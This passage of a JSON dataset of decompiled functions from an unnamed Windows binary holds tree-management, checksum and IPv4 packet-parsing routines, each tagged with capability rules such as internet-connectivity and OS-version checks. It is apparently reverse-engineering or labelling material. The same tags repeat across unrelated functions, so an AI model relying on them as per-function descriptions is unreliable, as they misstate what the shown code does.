*var_ch;\n        if (var_14h == 0) {\n            if (var_8h == 1) goto code_r0x0004dea9;\n            var_14h = *(var_10h + 1) - *(var_ch + 1);\n            if (var_14h == 0) {\n                if (var_8h == 2) goto code_r0x0004dea9;\n                var_14h = *(var_10h + 2) - *(var_ch + 2);\n                if (var_14h == 0) {\n                    if ((var_8h == 3) || (var_14h = *(var_10h + 3) - *(var_ch + 3),  var_14h == 0))\n                    goto code_r0x0004dea9;\n                }\n            }\n        }\n        var_18h = 1;\n        if (var_14h < 1) {\n            var_18h = -1;\n        }\n    }\n    if (var_18h != 0) {\ncode_r0x0004e001:\n        iVar1 = arg_10h[3];\n        iVar2 = fcn.000354c0(2);\n        if (iVar1 == iVar2) {\n            fcn.0004e040(arg_8h, arg_10h + 4, *(arg_10h + 7), 0);\n        }\n        return;\n    }\n    iVar3 = fcn.0003da90(arg_8h, 0);\n    var_24h = iVar3 + 0x10;\n    var_28h = arg_ch + 6;\n    for (var_20h = 6; 3 < var_20h; var_20h = var_20h - 4) {\n        if (*var_28h != *var_24h) goto code_r0x0004df27;\n        var_24h = var_24h + 1;\n        var_28h = var_28h + 1;\n    }\n    if (var_20h == 0) {\ncode_r0x0004dfa9:\n        var_30h = 0;\n    }\n    else {\ncode_r0x0004df27:\n        var_2ch = *var_28h - *var_24h;\n        if (var_2ch == 0) {\n            if (var_20h == 1) goto code_r0x0004dfa9;\n            var_2ch = *(var_28h + 1) - *(var_24h + 1);\n            if (var_2ch == 0) {\n                if (var_20h == 2) goto code_r0x0004dfa9;\n                var_2ch = *(var_28h + 2) - *(var_24h + 2);\n                if (var_2ch == 0) {\n                    if ((var_20h == 3) || (var_2ch = *(var_28h + 3) - *(var_24h + 3),  var_2ch == 0))\n                    goto code_r0x0004dfa9;\n                }\n            }\n        }\n        var_30h = 1;\n        if (var_2ch < 1) {\n            var_30h = -1;\n        }\n    }\n    if (var_30h == 0) {\n        return;\n    }\n    fcn.0004e040(arg_8h, arg_10h + 4, *(arg_10h + 7), 1);\n    fcn.0004e040(arg_8h, 0, *(arg_10h + 0xc), 0);\n    return;\n}\n",
        "token_count": 1318
    },
    "0004e040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0004e040(int32_t *arg_8h, int32_t **arg_ch, int32_t *arg_10h, uint arg_14h)\n\n{\n    int32_t **arg_8h_00;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t **var_30h;\n    int32_t **var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t **var_18h;\n    int32_t **var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    int32_t **var_8h;\n    uint var_1h;\n    \n    if (9999 < *0xb1c5a6d4) {\n        return 0;\n    }\n    arg_8h_00 = fcn.00035230(0x28);\n    if (arg_8h_00 == NULL) {\n        return 0;\n    }\n    *arg_8h_00 = NULL;\n    arg_8h_00[1] = NULL;\n    arg_8h_00[2] = NULL;\n    arg_8h_00[3] = NULL;\n    arg_8h_00[4] = NULL;\n    arg_8h_00[5] = NULL;\n    arg_8h_00[6] = NULL;\n    arg_8h_00[7] = NULL;\n    arg_8h_00[8] = NULL;\n    arg_8h_00[9] = NULL;\n    arg_8h_00[2] = arg_10h;\n    arg_8h_00[3] = arg_8h;\n    if (arg_ch != NULL) {\n        arg_8h_00[4] = *arg_ch;\n        *(arg_8h_00 + 5) = *(arg_ch + 1);\n    }\n    if (arg_14h == '\\0') {\n        arg_8h_00[7] = arg_8h_00[7] + 1;\n    }\n    else {\n        arg_8h_00[6] = arg_8h_00[6] + 1;\n    }\n    fcn.00035e60(arg_8h_00 + 9);\n    (**0xb1bde00c)();\n    if (*0xb1c5a6d4 < 10000) {\n        if (*0xb1c5a710 != NULL) {\n            var_8h = *0xb1c5a710;\n            while( true ) {\n                while( true ) {\n                    if ((var_8h[2] == arg_10h) && (var_8h[3] == arg_8h)) {\n                        if (arg_14h == '\\0') {\n                            var_8h[7] = var_8h[7] + 1;\n                        }\n                        else {\n                            var_8h[6] = var_8h[6] + 1;\n                        }\n                        if (arg_ch == NULL) goto code_r0x0004e386;\n                        var_10h = 6;\n                        var_14h = 0xb1c5b700;\n                        var_18h = var_8h + 4;\n                        goto code_r0x0004e1b6;\n                    }\n                    uVar1 = fcn.00035490(arg_10h);\n                    uVar2 = fcn.00035490(var_8h[2]);\n                    if (uVar1 < uVar2) break;\n                    if (var_8h[1] == NULL) {\n                        var_8h[1] = arg_8h_00;\n                        *0xb1c5a6d4 = *0xb1c5a6d4 + 1;\n                        arg_8h_00 = *0xb1c5a710;\n                        goto code_r0x0004e42a;\n                    }\n                    var_8h = var_8h[1];\n                }\n                if (*var_8h == NULL) break;\n                var_8h = *var_8h;\n            }\n            *var_8h = arg_8h_00;\n            *0xb1c5a6d4 = *0xb1c5a6d4 + 1;\n            arg_8h_00 = *0xb1c5a710;\n        }\n    }\n    else {\n        fcn.00035330(arg_8h_00);\n        arg_8h_00 = *0xb1c5a710;\n    }\n    goto code_r0x0004e42a;\ncode_r0x0004e1b6:\n    if (var_10h < 4) goto code_r0x0004e1bc;\n    if (*var_18h != *var_14h) goto code_r0x0004e1c6;\n    var_10h = var_10h - 4;\n    var_14h = var_14h + 1;\n    var_18h = var_18h + 1;\n    goto code_r0x0004e1b6;\ncode_r0x0004e1bc:\n    if (var_10h == 0) {\ncode_r0x0004e248:\n        var_20h = 0;\n    }\n    else {\ncode_r0x0004e1c6:\n        var_1ch = *var_18h - *var_14h;\n        if (var_1ch == 0) {\n            if (var_10h == 1) goto code_r0x0004e248;\n            var_1ch = *(var_18h + 1) - *(var_14h + 1);\n            if (var_1ch == 0) {\n                if (var_10h == 2) goto code_r0x0004e248;\n                var_1ch = *(var_18h + 2) - *(var_14h + 2);\n                if (var_1ch == 0) {\n                    if ((var_10h == 3) || (var_1ch = *(var_18h + 3) - *(var_14h + 3),  var_1ch == 0))\n                    goto code_r0x0004e248;\n                }\n            }\n        }\n        var_20h = 1;\n        if (var_1ch < 1) {\n            var_20h = -1;\n        }\n    }\n    if (var_20h == 0) {\n        var_8h[4] = *arg_ch;\n        *(var_8h + 5) = *(arg_ch + 1);\n    }\n    else {\n        var_2ch = arg_ch;\n        var_30h = var_8h + 4;\n        for (var_28h = 6; 3 < var_28h; var_28h = var_28h - 4) {\n            if (*var_30h != *var_2ch) goto code_r0x0004e2b5;\n            var_2ch = var_2ch + 1;\n            var_30h = var_30h + 1;\n        }\n        if (var_28h == 0) {\ncode_r0x0004e337:\n            var_38h = 0;\n        }\n        else {\ncode_r0x0004e2b5:\n            var_34h = *var_30h - *var_2ch;\n            if (var_34h == 0) {\n                if (var_28h == 1) goto code_r0x0004e337;\n                var_34h = *(var_30h + 1) - *(var_2ch + 1);\n                if (var_34h == 0) {\n                    if (var_28h == 2) goto code_r0x0004e337;\n                    var_34h = *(var_30h + 2) - *(var_2ch + 2);\n                    if (var_34h == 0) {\n                        if ((var_28h == 3) || (var_34h = *(var_30h + 3) - *(var_2ch + 3),  var_34h == 0))\n                        goto code_r0x0004e337;\n                    }\n                }\n            }\n            var_38h = 1;\n            if (var_34h < 1) {\n                var_38h = -1;\n            }\n        }\n        if (var_38h != 0) {\n            var_8h[8] = var_8h[8] + 1;\n        }\n    }\ncode_r0x0004e386:\n    fcn.00035e60(var_8h + 9);\n    fcn.00035330(arg_8h_00);\n    arg_8h_00 = *0xb1c5a710;\ncode_r0x0004e42a:\n    *0xb1c5a710 = arg_8h_00;\n    (**0xb1bde010)();\n    return 1;\n}\n",
        "token_count": 2084
    },
    "0004e450": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0004e450(int32_t *arg_8h)\n\n{\n    if (*arg_8h != 0) {\n        fcn.0004e450(*arg_8h);\n    }\n    if (arg_8h[1] != 0) {\n        fcn.0004e450(arg_8h[1]);\n    }\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 97
    },
    "0004e490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nbool __cdecl fcn.0004e490(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint *var_8h;\n    uint var_1h;\n    \n    (**0xb1bde00c)();\n    var_8h = *0xb1c5a710;\n    while (var_8h != NULL) {\n        if ((var_8h[2] == arg_ch) && (var_8h[3] == arg_8h)) {\n            var_ch = 6;\n            var_10h = 0xb1c5b700;\n            var_14h = var_8h + 4;\n            goto code_r0x0004e507;\n        }\n        uVar1 = fcn.00035490(arg_ch);\n        uVar2 = fcn.00035490(var_8h[2]);\n        if (uVar1 < uVar2) {\n            var_8h = *var_8h;\n        }\n        else {\n            var_8h = var_8h[1];\n        }\n    }\n    goto code_r0x0004e60f;\ncode_r0x0004e507:\n    if (var_ch < 4) goto code_r0x0004e50d;\n    if (*var_14h != *var_10h) goto code_r0x0004e517;\n    var_ch = var_ch - 4;\n    var_10h = var_10h + 1;\n    var_14h = var_14h + 1;\n    goto code_r0x0004e507;\ncode_r0x0004e50d:\n    if (var_ch == 0) {\ncode_r0x0004e599:\n        var_1ch = 0;\n    }\n    else {\ncode_r0x0004e517:\n        var_18h = *var_14h - *var_10h;\n        if (var_18h == 0) {\n            if (var_ch == 1) goto code_r0x0004e599;\n            var_18h = *(var_14h + 1) - *(var_10h + 1);\n            if (var_18h == 0) {\n                if (var_ch == 2) goto code_r0x0004e599;\n                var_18h = *(var_14h + 2) - *(var_10h + 2);\n                if (var_18h == 0) {\n                    if ((var_ch == 3) || (var_18h = *(var_14h + 3) - *(var_10h + 3),  var_18h == 0))\n                    goto code_r0x0004e599;\n                }\n            }\n        }\n        var_1ch = 1;\n        if (var_18h < 1) {\n            var_1ch = -1;\n        }\n    }\n    if (var_1ch == 0) {\n        var_8h = NULL;\n    }\n    else {\n        puVar4 = var_8h;\n        for (iVar3 = 10; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *arg_10h = *puVar4;\n            puVar4 = puVar4 + 1;\n            arg_10h = arg_10h + 1;\n        }\n    }\ncode_r0x0004e60f:\n    (**0xb1bde010)();\n    return var_8h != NULL;\n}\n",
        "token_count": 874
    },
    "0004e630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0004e630(uint *arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    \n    if (arg_8h != NULL) {\n        fcn.0004e630(*arg_8h, arg_ch, arg_10h);\n        if (arg_10h != 0) {\n            puVar2 = arg_8h;\n            puVar3 = *arg_ch * 0x28 + arg_10h;\n            for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = *puVar2;\n                puVar2 = puVar2 + 1;\n                puVar3 = puVar3 + 1;\n            }\n        }\n        *arg_ch = *arg_ch + 1;\n        fcn.0004e630(arg_8h[1], arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "0004e6a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0004e6a0(uint16_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    var_4h = arg_8h[9] +\n             arg_8h[8] + arg_8h[7] + arg_8h[6] + arg_8h[5] + arg_8h[4] + arg_8h[3] + arg_8h[2] + arg_8h[1] + *arg_8h;\n    arg_8h = arg_8h + 10;\n    for (arg_ch = arg_ch + -0x14; arg_ch != 0; arg_ch = arg_ch + -4) {\n        var_4h = arg_8h[1] + *arg_8h + var_4h;\n        arg_8h = arg_8h + 2;\n    }\n    uVar1 = (var_4h >> 0x10) + (var_4h & 0xffff);\n    return ~((uVar1 >> 0x10) + uVar1);\n}\n",
        "token_count": 265
    },
    "0004e7a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0004e7a0(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = arg_ch[9] +\n             arg_ch[8] +\n             arg_ch[7] +\n             arg_ch[6] +\n             arg_ch[5] +\n             arg_ch[4] +\n             arg_ch[3] +\n             arg_ch[2] + arg_ch[1] + *arg_ch + arg_8h[5] + arg_8h[4] + arg_8h[3] + arg_8h[2] + arg_8h[1] + *arg_8h;\n    arg_ch = arg_ch + 10;\n    for (arg_10h = arg_10h + -0x14; 0x1f < arg_10h; arg_10h = arg_10h + -0x20) {\n        var_4h = arg_ch[0xf] +\n                 arg_ch[0xe] +\n                 arg_ch[0xd] +\n                 arg_ch[0xc] +\n                 arg_ch[0xb] +\n                 arg_ch[10] +\n                 arg_ch[9] +\n                 arg_ch[8] +\n                 arg_ch[7] + arg_ch[6] + arg_ch[5] + arg_ch[4] + arg_ch[3] + arg_ch[2] + arg_ch[1] + *arg_ch + var_4h;\n        arg_ch = arg_ch + 0x10;\n    }\n    for (; 7 < arg_10h; arg_10h = arg_10h + -8) {\n        var_4h = arg_ch[3] + arg_ch[2] + arg_ch[1] + *arg_ch + var_4h;\n        arg_ch = arg_ch + 4;\n    }\n    for (; 1 < arg_10h; arg_10h = arg_10h + -2) {\n        var_4h = *arg_ch + var_4h;\n        arg_ch = arg_ch + 1;\n    }\n    if (arg_10h == 1) {\n        var_4h = *arg_ch + var_4h;\n    }\n    uVar1 = (var_4h >> 0x10) + (var_4h & 0xffff);\n    return ~((uVar1 >> 0x10) + uVar1);\n}\n",
        "token_count": 566
    },
    "0004ea30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0004ea30(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = arg_ch[3] +\n             arg_ch[2] + arg_ch[1] + *arg_ch + arg_8h[5] + arg_8h[4] + arg_8h[3] + arg_8h[2] + arg_8h[1] + *arg_8h;\n    arg_ch = arg_ch + 4;\n    for (arg_10h = arg_10h + -8; 0x1f < arg_10h; arg_10h = arg_10h + -0x20) {\n        var_4h = arg_ch[0xf] +\n                 arg_ch[0xe] +\n                 arg_ch[0xd] +\n                 arg_ch[0xc] +\n                 arg_ch[0xb] +\n                 arg_ch[10] +\n                 arg_ch[9] +\n                 arg_ch[8] +\n                 arg_ch[7] + arg_ch[6] + arg_ch[5] + arg_ch[4] + arg_ch[3] + arg_ch[2] + arg_ch[1] + *arg_ch + var_4h;\n        arg_ch = arg_ch + 0x10;\n    }\n    for (; 7 < arg_10h; arg_10h = arg_10h + -8) {\n        var_4h = arg_ch[3] + arg_ch[2] + arg_ch[1] + *arg_ch + var_4h;\n        arg_ch = arg_ch + 4;\n    }\n    for (; 1 < arg_10h; arg_10h = arg_10h + -2) {\n        var_4h = *arg_ch + var_4h;\n        arg_ch = arg_ch + 1;\n    }\n    if (arg_10h == 1) {\n        var_4h = *arg_ch + var_4h;\n    }\n    uVar1 = (var_4h >> 0x10) + (var_4h & 0xffff);\n    return ~((uVar1 >> 0x10) + uVar1);\n}\n",
        "token_count": 520
    },
    "0004ec80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0004ec80(uint16_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    for (; 0x1f < arg_ch; arg_ch = arg_ch + -0x20) {\n        var_4h = arg_8h[0xf] +\n                 arg_8h[0xe] +\n                 arg_8h[0xd] +\n                 arg_8h[0xc] +\n                 arg_8h[0xb] +\n                 arg_8h[10] +\n                 arg_8h[9] +\n                 arg_8h[8] +\n                 arg_8h[7] + arg_8h[6] + arg_8h[5] + arg_8h[4] + arg_8h[3] + arg_8h[2] + arg_8h[1] + *arg_8h + var_4h;\n        arg_8h = arg_8h + 0x10;\n    }\n    for (; 7 < arg_ch; arg_ch = arg_ch + -8) {\n        var_4h = arg_8h[3] + arg_8h[2] + arg_8h[1] + *arg_8h + var_4h;\n        arg_8h = arg_8h + 4;\n    }\n    for (; 1 < arg_ch; arg_ch = arg_ch + -2) {\n        var_4h = *arg_8h + var_4h;\n        arg_8h = arg_8h + 1;\n    }\n    if (arg_ch == 1) {\n        var_4h = *arg_8h + var_4h;\n    }\n    uVar1 = (var_4h >> 0x10) + (var_4h & 0xffff);\n    return ~((uVar1 >> 0x10) + uVar1);\n}\n",
        "token_count": 458
    },
    "0004ee40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_d4h\n// WARNING: Variable defined which should be unmapped: var_cch\n\nuint fcn.0004ee40(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint var_d4h;\n    uint var_cch;\n    uint *var_c8h;\n    uint *var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b0h;\n    uint *var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_24h;\n    \n    var_a4h = 0;\n    while( true ) {\n        if (4 < var_a4h) {\n            fcn.00033ff0(0xb1c5a718);\n            *0xb1c59beb = 0;\n            fcn.00032220(0xb1c5a720);\n            *0xb1c5a744 = 0;\n            *0xb1c5a748 = 0;\n            fcn.00032220(0xb1c5a71c);\n            *0xb1c5a74c = 0;\n            *0xb1c5a738 = 0;\n            *0xb1c5a73c = 0;\n            fcn.0001a8e0(0xb1c5a750, 0xb1c1ca80, 0);\n            fcn.0001a8e0(0xb1c5a778, 0xb1c1cd80, *0xb1c5a734);\n            return 0;\n        }\n        fcn.0002be20(&var_a0h, 0x73);\n        if (0 < var_a4h) {\n            fcn.0007870c(var_a4h, &var_24h, 10);\n            var_ach = &var_24h;\n            do {\n                cVar2 = *var_ach;\n                var_ach = var_ach + 1;\n            } while (cVar2 != '\\0');\n            uVar5 = var_ach - &var_24h;\n            var_c0h = &var_a4h + 3;\n            do {\n                pcVar1 = var_c0h + 1;\n                var_c0h = var_c0h + 1;\n            } while (*pcVar1 != '\\0');\n            puVar6 = &var_24h;\n            for (uVar4 = uVar5 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n                *var_c0h = *puVar6;\n                puVar6 = puVar6 + 1;\n                var_c0h = var_c0h + 1;\n            }\n            for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n                *var_c0h = *puVar6;\n                puVar6 = puVar6 + 1;\n                var_c0h = var_c0h + 1;\n            }\n        }\n        var_c8h = &var_a0h;\n        do {\n            cVar2 = *var_c8h;\n            var_c8h = var_c8h + 1;\n        } while (cVar2 != '\\0');\n        iVar3 = fcn.000745d0(var_a4h * 4 + -0x4e3a58dc, 0xb1c57d08, &var_a0h, var_c8h + (1 - (&var_a0h + 1)), 1);\n        if (iVar3 != 0) break;\n        var_a4h = var_a4h + 1;\n    }\n    for (; -1 < var_a4h; var_a4h = var_a4h + -1) {\n        fcn.00074950(var_a4h * 4 + -0x4e3a58dc, 0);\n    }\n    return 0xc0000001;\n}\n",
        "token_count": 939
    },
    "0004f0a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.0004f0a0(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    for (var_ch = 0; var_ch < 5; var_ch = var_ch * 4 + -0x4e3a58db) {\n        fcn.00074950(var_ch * 4 + -0x4e3a58dc, 0);\n    }\n    *0xb1c59beb = 1;\n    fcn.000340b0(0xb1c5a718);\n    fcn.00037270(0xb1c5a750, 0);\n    fcn.00037220(0xb1c5a750);\n    for (var_ch = 0; var_ch < 5; var_ch = var_ch + 1) {\n        iVar2 = fcn.00037240(var_ch * 8 + -0x4e3a58a8);\n        if (iVar2 != 0) {\n            fcn.00037270(var_ch * 8 + -0x4e3a58a8, 0);\n            fcn.00037220(var_ch * 8 + -0x4e3a58a8);\n        }\n    }\n    var_4h = *0xb1c5a748;\n    while (var_4h != NULL) {\n        puVar1 = *var_4h;\n        fcn.00035330(var_4h);\n        var_4h = puVar1;\n    }\n    var_4h = *0xb1c5a738;\n    while (var_4h != NULL) {\n        puVar1 = *var_4h;\n        fcn.00035330(var_4h);\n        var_4h = puVar1;\n    }\n    fcn.00034080(0xb1c5a718);\n    return;\n}\n",
        "token_count": 467
    },
    "0004f1b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl\nfcn.0004f1b0(uint arg_8h, uint arg_ch, uint8_t **arg_10h, int32_t arg_14h, uint8_t **arg_18h, uint8_t **arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint8_t uVar1;\n    uint8_t **in_EAX;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    uint8_t **ppuVar4;\n    uint8_t **ppuVar5;\n    ushort extraout_var;\n    uint32_t var_88h;\n    uint var_84h;\n    uint8_t *var_80h;\n    uint8_t *var_7ch;\n    uint var_78h;\n    uint8_t *var_74h;\n    uint8_t **var_70h;\n    uint8_t **var_6ch;\n    uint var_68h;\n    uchar var_61h;\n    uint8_t *var_60h;\n    uint8_t **var_5ch;\n    uint8_t **var_58h;\n    uint8_t **var_54h;\n    uint8_t **var_50h;\n    uchar var_49h;\n    uint var_48h;\n    uint8_t **var_44h;\n    uint8_t **var_40h;\n    uint8_t **var_3ch;\n    uint var_38h;\n    uint8_t **var_21h;\n    uint8_t *var_1ch;\n    uint8_t *var_18h;\n    uint var_14h;\n    uint8_t **var_10h;\n    uint8_t **var_ch;\n    uint8_t **var_8h;\n    uint8_t **var_4h;\n    \n    ppuVar5 = arg_18h;\n    var_5ch = NULL;\n    var_40h = NULL;\n    var_10h = NULL;\n    var_58h = NULL;\n    var_8h = NULL;\n    var_3ch = NULL;\n    var_4h = NULL;\n    var_44h = NULL;\n    var_54h = NULL;\n    var_50h = NULL;\n    var_74h = NULL;\n    var_21h._0_1_ = 2;\n    stack0xffffffdc = NULL;\n    if (arg_10h == NULL) {\n        var_5ch = arg_18h;\n        var_10h = arg_1ch;\n        ppuVar4 = arg_18h;\n        if (arg_1ch < 0xe) goto code_r0x0004f728;\n        var_70h = arg_18h;\n        arg_18h = arg_18h + 0xe;\n        var_10h = arg_1ch + -0xe;\n    }\n    else {\n        ppuVar4 = in_EAX;\n        if (arg_14h != 0xe) goto code_r0x0004f728;\n        var_70h = arg_10h;\n        var_10h = arg_1ch;\n    }\n    var_5ch = ppuVar5;\n    ppuVar4 = fcn.000354c0(arg_18h & 0xffff0000 | *(var_70h + 3));\n    if ((ppuVar4 & 0xffff) == 0x800) {\n        if (0x13 < var_10h) {\n            var_8h = arg_18h;\n            uVar2 = fcn.000354c0(CONCAT22(extraout_var, *(arg_18h + 2)));\n            var_ch = uVar2 & 0xffff;\n            var_6ch = (*var_8h & 0xf) << 2;\n            ppuVar4 = var_6ch;\n            if ((0x13 < var_6ch) && (var_6ch <= var_ch)) {\n                ppuVar4 = fcn.0004e6a0(var_8h, var_6ch);\n                var_48h._0_2_ = ppuVar4;\n                if ((ppuVar4 & 0xffff) == NULL) {\n                    ppuVar5 = ppuVar4 & 0xffff;\n                    if (arg_20h == 0) {\n                        if (((0x2d < var_ch) && (var_ch != var_10h)) ||\n                           ((var_ch < 0x2e && (ppuVar4 = var_ch,  var_10h < var_ch)))) goto code_r0x0004f728;\n                        ppuVar5 = var_10h;\n                        if (var_10h != var_ch) {\n                            var_10h = var_ch;\n                        }\n                    }\n                    var_68h._0_2_ = fcn.000354c0(ppuVar5 & 0xffff0000 | *(var_8h + 6));\n                    var_61h = (var_68h & 0x4000) >> 0xe;\n                    ppuVar4 = (var_68h & 0x2000) >> 0xd;\n                    var_49h = SUB41(ppuVar4, 0);\n                    var_68h._0_2_ = var_68h & 0x1fff;\n                    if ((var_68h == 0) && (ppuVar4 == NULL)) {\n                        ppuVar5 = arg_18h + var_6ch;\n                        var_10h = var_10h - var_6ch;\n                        uVar1 = *(var_8h + 9);\n                        ppuVar4 = var_8h;\n                        arg_18h = ppuVar5;\n                        if (uVar1 == 1) {\n                            if (0x3 < var_10h) {\n                                var_44h = ppuVar5;\n                                if (arg_20h == 0) {\n                                    ppuVar4 = fcn.0004ec80(ppuVar5, var_10h);\n                                    var_48h._0_2_ = ppuVar4;\n                                    if (var_48h != 0) goto code_r0x0004f728;\n                                }\n                                arg_18h = ppuVar5 + 1;\n                                var_10h = var_10h + -1;\n                                ppuVar4 = var_10h;\n                                if (0x1a < var_10h) {\n                                    var_50h = arg_18h;\n                                    var_54h = fcn.00035490(*arg_18h);\n                                    arg_18h = ppuVar5 + 2;\n                                    var_10h = var_10h + -1;\n                                    *NULL = fcn.00049620(arg_18h, 0x16);\n                                    ppuVar4 = *NULL;\n                                    if (*NULL == NULL) {\n                                        if ((0x1a < var_10h) &&\n                                           (var_50h = arg_18h,  var_54h = fcn.00035490(*arg_18h),  ppuVar4 = var_54h, \n                                           (var_54h & 0x80000000) != 0)) {\n                                            arg_18h = ppuVar5 + 3;\n                                            var_10h = var_10h + -1;\n                                            *NULL = fcn.00049620(arg_18h, 0x16);\n                                            ppuVar4 = *NULL;\n                                            if (*NULL != NULL) {\n                                                ppuVar4 = -((var_54h & 0x20000000) != 0) & 4;\n                                                var_21h._0_1_ = -((var_54h & 0x40000000) != 0) & 2U | 1 | ppuVar4 | 8;\n                                                if (arg_20h == 0) {\n                                                    var_74h = var_50h[-1];\n                                                    var_50h[-1] = NULL;\n                                                    ppuVar4 = var_50h;\n                                                }\n                                            }\n                                        }\n                                    }\n                                    else if ((var_54h & 0x80000000) != 0) {\n                                        ppuVar4 = -((var_54h & 0x20000000) != 0) & 4;\n                                        var_21h._0_1_ = -((var_54h & 0x40000000) != 0) & 2U | 1 | ppuVar4;\n                                    }\n                                }\n                            }\n                        }\n                        else if (uVar1 == 6) {\n                            if (0x13 < var_10h) {\n                                var_6ch = ((*(ppuVar5 + 3) & 0xf0) >> 4) << 2;\n                                var_3ch = ppuVar5;\n                                if (arg_20h == 0) {\n                                    var_80h = var_8h[3];\n                                    var_7ch = var_8h[4];\n                                    var_78h._0_1_ = 0;\n                                    var_78h._1_1_ = *(var_8h + 9);\n                                    var_78h._2_2_ = fcn.000354c0(var_7ch & 0xffff0000 | var_10h & 0xffff);\n                                    var_48h._0_2_ = fcn.0004e7a0(&var_80h, var_3ch, var_10h);\n                                    ppuVar4 = var_48h;\n                                    if (var_48h != NULL) goto code_r0x0004f728;\n                                }\n                                arg_18h = ppuVar5 + var_6ch;\n                                var_10h = var_10h - var_6ch;\n                                ppuVar4 = 